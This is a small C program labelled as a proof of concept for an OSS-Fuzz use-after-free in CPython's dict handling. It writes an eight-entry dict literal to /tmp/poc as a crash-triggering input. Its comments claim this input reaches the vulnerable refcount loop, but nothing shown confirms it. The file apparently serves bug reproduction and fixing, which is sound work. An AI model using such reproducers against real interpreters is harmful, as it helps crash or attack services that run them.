#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for oss-fuzz:368076875 */
/* Triggers: heap-use-after-free in _Py_IsImmortal (CPython dict/AST) */
/* Vuln class: use_after_free */

int main(void) {
    /* Write a Python dict literal with 8 entries to force non-immortal refcount */
    /* This reaches the vulnerable Py_XDECREF loop in dictkeys_decref */
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }
    fputc('{', f);
    for (int i = 0; i < 8; i++) {
        if (i) fputc(',', f);
        fprintf(f, "%d:%d", i, i);
    }
    fputc('}', f);
    fputc('\0', f);
    fclose(f);
    return 0;
}